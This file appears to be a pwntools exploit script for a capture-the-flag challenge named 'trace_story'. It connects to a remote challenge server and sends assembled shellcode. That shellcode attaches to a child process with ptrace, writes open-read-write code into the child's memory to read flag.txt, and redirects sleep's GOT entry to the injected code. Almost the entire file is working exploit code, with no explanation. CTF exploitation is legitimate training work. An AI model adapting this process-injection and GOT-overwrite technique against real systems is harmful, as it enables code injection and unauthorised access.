#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '0.cloud.chals.io', 15148
binary = './trace_story'
brkpts = '''
set follow-fork-mode parent
b*0x401907
c
'''

elf = ELF("trace_story")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

readstory_addr = 0x402011
addr = 0x401789
fn_addr = 0x401356
open_got = 0x404088
sleep_got = 0x404098

if __name__ == "__main__":
    reu("child pid: ")
    pid = int(rl().strip().decode())
    log.info("Child @ "+str(pid))

    execve = [
        0x622fb949,
        0x732f6e69,
        0x51410068,
        0x31485f54,
        0xd23148f6,
        0x3bc0c748,
        0xf000000,
        0x5
    ]

    sc = shellcraft.open("flag.txt")
    sc += shellcraft.read('rax', 'rsp', 100)
    sc += shellcraft.write(1, 'rsp', 100)
    sc = asm(sc)
    sc = sc.ljust(56, b"\x00")

    orw = [u32(sc[i:i+4]) for i in range(0, 56, 4)]

    addr = [fn_addr + i for i in range(0, 56, 4)]

    shellcode = asm(f"""
        .intel_syntax noprefix

        // ptrace(PT_ATTACH, pid, 0, 0)
        mov rdi, 0x10
        mov rsi, {pid}
        mov rdx, 0
        mov r10, 0
        mov rax, 101
        syscall

        mov ebx, 0
        sleep:
        inc ebx
        mov rax, 102
        syscall
        cmp ebx, 0x1000
        jne sleep

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[0]}
        mov r10, {orw[0]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[1]}
        mov r10, {orw[1]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[2]}
        mov r10, {orw[2]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[3]}
        mov r10, {orw[3]}
        mov rax, 101
        syscall
        
        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[4]}
        mov r10, {orw[4]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[5]}
        mov r10, {orw[5]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[6]}
        mov r10, {orw[6]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[7]}
        mov r10, {orw[7]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[8]}
        mov r10, {orw[8]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[9]}
        mov r10, {orw[9]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[10]}
        mov r10, {orw[10]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[11]}
        mov r10, {orw[11]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[12]}
        mov r10, {orw[12]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_I, pid, addr, shellcode)
        mov rdi, 4
        mov rsi, {pid}
        mov rdx, {addr[13]}
        mov r10, {orw[13]}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_D, pid, sleep_got, addr)
        mov rdi, 5
        mov rsi, {pid}
        mov rdx, {sleep_got}
        mov r10, {fn_addr}
        mov rax, 101
        syscall

        // ptrace(PT_WRITE_D, pid, sleep_got, addr)
        mov rdi, 5
        mov rsi, {pid}
        mov rdx, {sleep_got+4}
        mov r10, 0
        mov rax, 101
        syscall

        // ptrace(PT_DETACH, pid, 0, 0)
        mov rdi, 0x11
        mov rsi, {pid}
        mov rdx, 0
        mov r10, 0
        mov rax, 101
        syscall

        loop: jmp loop
    """)



    sla("Input: \n", shellcode)
    io.interactive()
